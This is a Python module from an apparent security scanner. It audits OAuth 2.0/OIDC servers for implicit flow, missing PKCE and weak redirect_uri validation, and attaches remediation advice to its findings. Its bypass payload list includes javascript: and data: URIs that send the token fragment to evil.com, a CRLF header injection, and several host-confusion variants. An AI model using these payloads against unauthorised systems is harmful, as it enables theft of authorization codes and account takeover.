"""OAuth 2.0 / OIDC security audit — redirect_uri bypass, PKCE, state bypass."""
from __future__ import annotations
import asyncio
import re
import urllib.parse
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

OAUTH_DISCOVERY_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/oauth/.well-known/openid-configuration",
    "/auth/realms/master/.well-known/openid-configuration",
]

REDIRECT_URI_BYPASS_VARIANTS = [
    "https://evil.com",
    "https://evil.com/",
    "{legit}@evil.com",
    "https://{legit}.evil.com",
    "https://{legit}evil.com",
    "https://evil.com/{legit}",
    "{legit}/../redirect?to=https://evil.com",
    "https://{legit}%0d%0aLocation: https://evil.com",
    "javascript:fetch('https://evil.com/steal?token='+location.hash)",
    "data:text/html,<script>location='https://evil.com/?c='+location.hash</script>",
]


async def _discover_oauth(base_url: str, client: TalismanHTTPClient) -> dict | None:
    for path in OAUTH_DISCOVERY_PATHS:
        try:
            r = await client.get(base_url.rstrip("/") + path, timeout=8)
            if r.status_code == 200:
                data = r.json()
                if "authorization_endpoint" in data or "token_endpoint" in data:
                    return data
        except Exception:
            pass
    return None


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    client_id: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module]⚡ OAuth 2.0 / OIDC Audit[/module] → [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        # Discover OAuth config
        oauth_config = await _discover_oauth(url, client)

        if oauth_config:
            console.print(f"  [success]✓ OAuth/OIDC configuration discovered[/success]")
            auth_ep = oauth_config.get("authorization_endpoint", "")
            token_ep = oauth_config.get("token_endpoint", "")
            console.print(f"  Authorization: {auth_ep}")
            console.print(f"  Token: {token_ep}")

            # Check for dangerous response types
            response_types = oauth_config.get("response_types_supported", [])
            if "token" in response_types:
                print_finding("OAuth implicit flow supported (token in URL fragment)", "medium", url)
                findings.append({"issue": "implicit_flow", "severity": "medium"})
                if session:
                    await session.add_finding(
                        target=url, module="oauth", vuln_type="implicit_flow",
                        severity="medium", confidence="confirmed",
                        title="OAuth implicit flow supported",
                        description="Implicit flow returns access tokens in URL fragments, exposing them to browser history and referrer headers.",
                        remediation="Migrate to authorization code flow with PKCE. Disable implicit flow.",
                        cwe="CWE-346",
                    )

            # Check PKCE support
            pkce_methods = oauth_config.get("code_challenge_methods_supported", [])
            if not pkce_methods:
                print_finding("PKCE not enforced by OAuth server", "medium", url)
                findings.append({"issue": "no_pkce", "severity": "medium"})

            # Test redirect_uri bypass if auth endpoint and client_id available
            if auth_ep and client_id:
                for variant in REDIRECT_URI_BYPASS_VARIANTS[:5]:
                    test_redirect = variant.replace("{legit}", url.split("//")[-1].split("/")[0])
                    test_url = (
                        f"{auth_ep}?response_type=code&client_id={client_id}"
                        f"&redirect_uri={urllib.parse.quote(test_redirect)}&state=test"
                    )
                    try:
                        r = await client.get(test_url, allow_redirects=False, timeout=8)
                        if r.status_code in (301, 302):
                            location = r.headers.get("location", "")
                            if "evil.com" in location or "code=" in location:
                                severity = "critical"
                                title = f"OAuth redirect_uri bypass: {test_redirect[:60]}"
                                print_finding(title, severity, url)
                                findings.append({"issue": "redirect_uri_bypass",
                                                "payload": test_redirect, "location": location})
                                if session:
                                    await session.add_finding(
                                        target=url, module="oauth",
                                        vuln_type="oauth_redirect_bypass",
                                        severity=severity, confidence="confirmed",
                                        title=title,
                                        description=(
                                            f"OAuth redirect_uri validation bypassed using '{test_redirect}'. "
                                            "Authorization codes can be stolen to achieve account takeover."
                                        ),
                                        evidence=f"Location: {location}",
                                        reproduction=f"Navigate to: {test_url}",
                                        remediation=(
                                            "1. Use exact string matching for redirect_uri validation.\n"
                                            "2. Pre-register all allowed redirect URIs.\n"
                                            "3. Never use regex or prefix matching for redirect_uri."
                                        ),
                                        cvss_score=9.3, cwe="CWE-601",
                                    )
                                break
                    except Exception:
                        pass
        else:
            console.print("  No OAuth/OIDC configuration found")

    console.print(f"  OAuth audit complete — {len(findings)} issues")
    return {"target": url, "oauth_config": oauth_config, "findings": findings}
